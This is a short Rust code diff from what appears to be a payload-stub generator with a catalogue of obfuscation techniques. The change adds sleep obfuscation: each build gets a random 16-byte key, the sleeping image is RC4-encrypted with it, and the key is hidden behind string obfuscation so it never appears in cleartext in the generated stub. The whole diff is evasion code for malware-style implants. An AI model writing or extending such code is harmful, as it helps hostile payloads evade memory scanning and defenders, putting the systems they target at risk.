@@ -7,6 +7,8 @@
 
 use serde::{Deserialize, Serialize};
 
+use rand::RngCore;
+
 use crate::engine::obfuscation::StringsConfig;
 
 use super::{Capability, Category, Stability, TechniqueDef};
@@ -208,7 +210,17 @@ impl Params {
             let expr = strings.obfuscate(name).render_stub_expr(var);
             fragment = fragment.replace(placeholder, &expr);
         }
-        fragment.replace("$SLEEP_MS$", &self.sleep_ms.to_string())
+        fragment = fragment.replace("$SLEEP_MS$", &self.sleep_ms.to_string());
+
+        // The sleeping image is RC4-encrypted with a fresh per-build key; its
+        // hex form is rebuilt at runtime through `strings`, so it never lands in
+        // cleartext in the generated stub.
+        let mut key = [0u8; 16];
+        rand::thread_rng().fill_bytes(&mut key);
+        let key_def = strings
+            .obfuscate(&hex::encode(key))
+            .render_stub_expr("sleep_key");
+        fragment.replace("$SLEEP_KEY_DEF$", &key_def)
     }
 }
 
